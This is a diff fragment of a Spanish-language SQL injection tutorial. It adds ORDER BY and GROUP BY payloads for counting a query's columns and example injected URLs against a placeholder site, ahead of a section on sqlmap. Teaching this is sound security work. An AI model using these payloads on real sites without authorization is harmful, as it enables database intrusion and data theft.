@@ -74,26 +74,32 @@ Ya tenemos el parámetro vulnerable, ahora tenemos que identificar el número de
 Aquí tenemos que ir testeando el numero de columnas, aquí un ejemplo de como usar el order by y el group by:
 
 ```
-1' ORDER BY 1 --+	#
-1' ORDER BY 2 --+	#
-1' ORDER BY 3 --+	#
-1' ORDER BY 4 --+	#
+1' ORDER BY 1 --+	
+1' ORDER BY 2 --+	
+1' ORDER BY 3 --+	
+1' ORDER BY 4 --+	
 etc...
 ```
 ```
-1' GROUP BY 1--+	#
-1' GROUP BY 2--+	#
-1' GROUP BY 3--+	#
-1' GROUP BY 4--+	#
+1' GROUP BY 1--+	
+1' GROUP BY 2--+	
+1' GROUP BY 3--+	
+1' GROUP BY 4--+	
 etc...
 ```
 
+Aquí lo que estamos buscando es que la pagina nos genere un error al inyectar un numero que supera las columnas usadas por la página, para que sea un poco mas entendible vamos a verlo de esta manera:
+
+Imaginamos que la pagina tiene `23` columnas, volviendo al ejemplo anterior en donde ya descubrimos el parámetro vulnerable nos quedaria algo como esto:
 
 
-volviendo al ejemplo anterior en donde ya descubrimos el parámetro vulnerable nos quedaria algo como esto:
+```
 
+-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 1 --+ #sin error
 
-`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1'`
+-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 2 --+ #sin error
+
+```
 
 
 ## Inyección sql automatizada con sqlmap
